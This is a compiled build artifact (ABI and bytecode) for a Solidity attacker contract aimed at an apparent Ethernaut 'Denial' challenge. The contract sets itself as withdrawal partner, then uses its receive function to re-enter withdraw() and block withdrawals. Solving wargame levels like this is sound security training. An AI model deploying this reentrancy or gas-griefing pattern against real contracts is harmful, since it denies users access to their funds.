{"abi":[{"type":"constructor","inputs":[{"name":"_instance","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"nonpayable"},{"type":"function","name":"denialInstance","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address payable"}],"stateMutability":"view"}],"bytecode":{"object":"0x60a060405234801561000f575f5ffd5b5060405161046c38038061046c83398101604081905261002e9161003f565b6001600160a01b031660805261006c565b5f6020828403121561004f575f5ffd5b81516001600160a01b0381168114610065575f5ffd5b9392505050565b6080516103d56100975f395f818160730152818160f00152818161016c01526102b501526103d55ff3fe60806040526004361061002b575f3560e01c8063721c5a88146100df5780639e5faafc1461013b575f5ffd5b366100db5760408051600481526024810182526020810180516001600160e01b0316633ccfd60b60e01b17905290515f9173ffffffffffffffffffffffffffffffffffffffff7f0000000000000000000000000000000000000000000000000000000000000000169161009e9190610373565b5f604051808303815f865af19150503d805f81146100d4576040519150601f19603f3d011682016040523d82523d5f602084013e005b606091505b005b5f5ffd5b3480156100ea575f5ffd5b506101127f000000000000000000000000000000000000000000000000000000000000000081565b60405173ffffffffffffffffffffffffffffffffffffffff909116815260200160405180910390f35b348015610146575f5ffd5b506100d96040513060248201525f9073ffffffffffffffffffffffffffffffffffffffff7f0000000000000000000000000000000000000000000000000000000000000000169060440160408051601f198184030181529181526020820180516001600160e01b03167f4e1c591400000000000000000000000000000000000000000000000000000000179052516101de9190610373565b5f604051808303815f865af19150503d805f8114610217576040519150601f19603f3d011682016040523d82523d5f602084013e61021c565b606091505b50509050806102725760405162461bcd60e51b815260206004820152601260248201527f506172746e657220736574206661696c6564000000000000000000000000000060448201526064015b60405180910390fd5b60408051600481526024810182526020810180516001600160e01b0316633ccfd60b60e01b17905290515f9173ffffffffffffffffffffffffffffffffffffffff7f000000000000000000000000000000000000000000000000000000000000000016916102e09190610373565b5f604051808303815f865af19150503d805f8114610319576040519150601f19603f3d011682016040523d82523d5f602084013e61031e565b606091505b505090508061036f5760405162461bcd60e51b815260206004820152601760248201527f496e697469616c207769746864726177206661696c65640000000000000000006044820152606401610269565b5050565b5f82515f5b818110156103925760208186018101518583015201610378565b505f92019182525091905056fea2646970667358221220e29015e0eeb0dfc78c1d6ac87a67c40413cae6c3ab4f7a2248c09d46eadb056c64736f6c634300081c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","denialInstance()":"721c5a88"},"id":0}